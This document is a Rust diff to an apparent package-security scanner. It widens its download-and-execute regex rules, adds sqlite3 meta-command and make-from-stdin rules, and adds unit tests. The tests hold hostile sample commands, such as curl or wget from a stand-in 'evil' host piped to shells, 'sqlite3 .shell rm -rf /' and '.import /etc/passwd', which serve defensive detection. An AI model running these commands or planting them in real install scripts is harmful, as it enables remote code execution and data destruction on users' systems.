@@ -5,7 +5,9 @@ mod loader;
 pub use loader::RuleLoader;
 
 use crate::error::Result;
-use crate::textutil::{deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS};
+use crate::textutil::{
+    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+};
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
 use serde::Deserialize;
@@ -517,7 +519,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"curl\s+[^|]+\|\s*{SHELLS}\b"),
+                pattern: format!(r"curl\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -531,7 +533,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             severity: Severity::Critical,
             category: Category::CommandInjection,
             patterns: vec![Pattern::Regex {
-                pattern: format!(r"wget\s+[^|]+\|\s*{SHELLS}\b"),
+                pattern: format!(r"wget\s+[^|]+\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b"),
             }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Download scripts first, review them, then execute".to_string(),
@@ -1499,20 +1501,33 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "ATOMIC-002".to_string(),
             name: "Node/Bun package manager in install hook".to_string(),
-            description: "Invokes npm/pnpm/yarn/bun to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm exec`, `pnpm dlx`, and `yarn dlx` run lifecycle/remote code just like `install`.".to_string(),
+            description: "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
                 // `ci` installs the full lockfile (lifecycle scripts run);
-                // `exec`/`dlx` fetch-and-run a package (npx-style RCE). The
-                // cross terms that don't exist as real subcommands (e.g. `npm
-                // dlx`, `yarn ci`) never appear in real PKGBUILDs, so folding
-                // them into one alternation is simpler without adding FPs.
+                // `exec`/`dlx`/`rebuild` fetch-and-run or re-run lifecycle code.
+                // The cross terms that don't exist as real subcommands (e.g.
+                // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
+                // folding them into one alternation is simpler without adding FPs.
+                // `explore <pkg> -- cmd` runs an arbitrary command in a package
+                // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec)\b".to_string(),
+                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
+                        .to_string(),
                 },
+                // `bun` subcommands (NOT `bunx`, which is the runner below — the
+                // `\s+` after `bun` excludes `bunx`).
                 Pattern::Regex {
-                    pattern: r"\bbunx?\s+(install|add|i|x)\b".to_string(),
+                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
+                },
+                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
+                // fetch and run a package directly (no subcommand) — the most
+                // common fetch-and-run RCE, and the exact form the old
+                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
+                // missed. A bare runner followed by any argument is the attack.
+                Pattern::Regex {
+                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
@@ -1956,7 +1971,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
             severity: Severity::High,
             category: Category::Obfuscation,
-            patterns: vec![Pattern::Regex { pattern: format!(r"\b{SHELLS}\s*<<<") }],
+            patterns: vec![Pattern::Regex { pattern: format!(r"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s*<<<") }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Review the here-string; this executes an assembled command.".to_string(),
             cwe_id: Some("CWE-94".to_string()),
@@ -1970,7 +1985,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
-            patterns: vec![Pattern::Regex { pattern: format!(r#"\b{SHELLS}\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
+            patterns: vec![Pattern::Regex { pattern: format!(r#"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
@@ -1986,6 +2001,39 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
             recommendation: "Review the detached process; this outlives the install.".to_string(),
             cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+        },
+        Rule {
+            id: "EXEC-006".to_string(),
+            name: "sqlite3 shell-command execution".to_string(),
+            description: "sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            // Require the dot-command form: a `.` preceded by whitespace or a
+            // quote (the start of a sqlite3 meta-command), so a filename like
+            // `data.import` or a column named `system` is not matched.
+            patterns: vec![Pattern::Regex {
+                pattern: r#"\bsqlite3\b[^\n]*[\s"']\.(?:shell|system|import)\b"#.to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+        },
+        Rule {
+            id: "EXEC-007".to_string(),
+            name: "make reads a Makefile from stdin".to_string(),
+            description: "`make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.".to_string(),
+            severity: Severity::High,
+            category: Category::CommandInjection,
+            // The `-`/`/dev/stdin` operand must stand alone (followed by space or
+            // EOL) so `make -j4`, `make -C dir`, `make --version` do NOT match.
+            patterns: vec![Pattern::Regex {
+                pattern: r"\bg?make\s+(?:-f\s*)?(?:-|/dev/stdin)(?:\s|$)".to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
             enabled: true,
         },
     ]
@@ -2261,6 +2309,154 @@ mod tests {
         let engine = RuleEngine::default();
         let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
         assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "curl|dash must trip DLE-001: {m:?}");
+    }
+
+    #[test]
+    fn test_curl_pipe_ash_mksh_detected() {
+        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
+        // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | ash",
+            "curl -fsSL https://evil/x | mksh",
+            "wget -qO- https://evil/x | ash",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic002_catches_npx_bunx_runners() {
+        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
+        // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
+        // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
+        // both missed. `explore` runs a command in a package dir.
+        let engine = RuleEngine::default();
+        for s in [
+            "npx malicious-tool",
+            "npx -y atomic-lockfile",
+            "bunx cowsay",
+            "pnpx some-tool",
+            "npm rebuild",
+            "npm explore evil -- ./run",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
+                "missed ATOMIC-002 for runner: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
+        // Task 4050 exhaustive scope: a shell reached via an absolute path
+        // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
+        // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
+        // member of the curated long-tail must all trip DLE-001. These produced
+        // ZERO findings before.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | /bin/sh",
+            "curl -fsSL https://evil/x | /usr/bin/bash",
+            "curl -fsSL https://evil/x | busybox sh",
+            "curl -fsSL https://evil/x | busybox ash",
+            "curl -fsSL https://evil/x | env sh",
+            "curl -fsSL https://evil/x | /usr/bin/env sh",
+            "curl -fsSL https://evil/x | env -i sh",
+            "curl -fsSL https://evil/x | env FOO=bar sh",
+            "curl -fsSL https://evil/x | command busybox sh",
+            "curl -fsSL https://evil/x | nice dash",
+            // long-tail shells
+            "curl -fsSL https://evil/x | mksh",
+            "curl -fsSL https://evil/x | yash",
+            "curl -fsSL https://evil/x | xonsh",
+            "curl -fsSL https://evil/x | nu",
+            "curl -fsSL https://evil/x | oil",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "DLE-001"),
+                "launcher/path/long-tail pipe-to-shell must trip DLE-001: {s} -> {m:?}"
+            );
+        }
+        // wget variant -> DLE-002
+        let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
+        assert!(m.iter().any(|x| x.rule_id == "DLE-002"), "wget|/bin/sh must trip DLE-002: {m:?}");
+    }
+
+    #[test]
+    fn test_exec006_sqlite3_shell_exec() {
+        // Task 4050 round 3 / Class 3: sqlite3 .shell/.system/.import exec form.
+        let engine = RuleEngine::default();
+        for s in [
+            r#"sqlite3 mydb ".shell rm -rf /""#,
+            r#"sqlite3 mydb ".system curl evil | sh""#,
+            r#"sqlite3 db <<< '.import /etc/passwd t'"#,
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(m.iter().any(|x| x.rule_id == "EXEC-006"), "missed EXEC-006: {s} -> {m:?}");
+        }
+        // FP: a normal query mentioning a column/table named like the meta-command.
+        for ok in [
+            r#"sqlite3 db "SELECT * FROM systems""#,
+            r#"sqlite3 db ".tables""#,
+            r#"sqlite3 db "INSERT INTO t VALUES ('data.import')""#,
+        ] {
+            let m = engine.match_content(ok, FileType::InstallScript);
+            assert!(!m.iter().any(|x| x.rule_id == "EXEC-006"), "EXEC-006 false positive: {ok} -> {m:?}");
+        }
+    }
+
+    #[test]
+    fn test_exec007_make_from_stdin() {
+        // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
+        let engine = RuleEngine::default();
+        for s in ["make -f -", "make -f /dev/stdin", "gmake -f -", "curl https://e/x | make -f -"] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(m.iter().any(|x| x.rule_id == "EXEC-007"), "missed EXEC-007: {s} -> {m:?}");
+        }
+        // FP: ordinary make invocations must stay clean.
+        for ok in ["make -j4", "make -C build", "make --version", "make -f Makefile", "make install"] {
+            let m = engine.match_content(ok, FileType::Pkgbuild);
+            assert!(!m.iter().any(|x| x.rule_id == "EXEC-007"), "EXEC-007 false positive: {ok} -> {m:?}");
+        }
+    }
+
+    #[test]
+    fn test_shell_sink_no_false_positive() {
+        // The launcher/path generalization must not flag a pipe whose target is
+        // NOT a shell, even when a launcher word or path is present.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://x | /usr/bin/tee out.txt",
+            "curl -fsSL https://x | env grep foo",
+            "curl -fsSL https://x | nice make",
+            "curl -fsSL https://x | command ls",
+            "curl -fsSL https://x | /bin/number",
+            "curl -fsSL https://x | busybox cat",
+            "curl -fsSL https://x | awkward-tool",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "DLE-001"),
+                "non-shell pipe target must not trip DLE-001: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic002_bun_runner_not_double_reported() {
+        // The `bun` subcommand pattern and the `bunx` runner pattern must not
+        // both match the same line (they cover disjoint commands).
+        let engine = RuleEngine::default();
+        let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
+        let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
+        assert_eq!(n, 1, "bunx runner should report ATOMIC-002 exactly once: {m:?}");
     }
 
     #[test]
